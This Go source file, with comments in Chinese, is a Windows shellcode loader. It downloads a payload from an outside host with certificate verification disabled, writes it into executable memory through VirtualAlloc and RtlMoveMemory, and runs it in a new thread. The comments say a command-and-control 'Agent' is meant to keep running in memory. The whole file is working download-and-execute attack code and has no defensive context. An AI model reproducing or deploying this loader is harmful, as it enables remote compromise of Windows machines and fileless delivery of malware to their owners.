package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	// "os" // 已删除未使用的 os 包
	"syscall"
	"time"
	"unsafe"
)

// [配置] Shellcode 的下载地址 (请确保 payload.bin 已上传到服务器)
const ShellcodeURL = "https://api.cailiu666.xyz/payload.bin"

// Windows API 定义
var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	ntdll               = syscall.NewLazyDLL("ntdll.dll")
	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory       = ntdll.NewProc("RtlMoveMemory")
	CreateThread        = kernel32.NewProc("CreateThread")
	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func main() {
	// 1. 启动提示
	fmt.Println("[*] Loader 启动...")

	// 2. 下载 Shellcode
	fmt.Printf("[*] 正在下载 Payload: %s\n", ShellcodeURL)
	shellcode, err := downloadShellcode(ShellcodeURL)
	if err != nil {
		fmt.Printf("[!] 下载失败: %v\n", err)
		fmt.Println("[!] 请检查: 1. Server是否启动 2. payload.bin是否上传")
		time.Sleep(5 * time.Second)
		return
	}
	fmt.Printf("[+] 下载成功，大小: %d bytes\n", len(shellcode))

	if len(shellcode) == 0 {
		fmt.Println("[!] 错误: 下载到的 Payload 为空")
		return
	}

	// 3. 申请内存 (VirtualAlloc)
	addr, _, err := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		fmt.Println("[!] 内存申请失败:", err)
		return
	}
	fmt.Printf("[+] 内存申请成功: 0x%x\n", addr)

	// 4. 写入 Shellcode (RtlMoveMemory)
	_, _, _ = RtlMoveMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)
	fmt.Println("[+] Payload 已注入内存")

	// 5. 执行 Shellcode (CreateThread)
	thread, _, err := CreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if thread == 0 {
		fmt.Println("[!] 线程创建失败:", err)
		return
	}
	fmt.Println("[+] 线程已启动! Agent 正在内存中运行...")

	// 6. 阻止主进程退出
	// Agent 是在子线程里跑的，如果主进程退了，Agent 也就没了
	// 所以这里我们要无限等待
	_, _, _ = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
}

func downloadShellcode(url string) ([]byte, error) {
	// 跳过证书验证 (防止虚拟机根证书问题)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("HTTP状态码错误: %d", resp.StatusCode)
	}

	return io.ReadAll(resp.Body)
}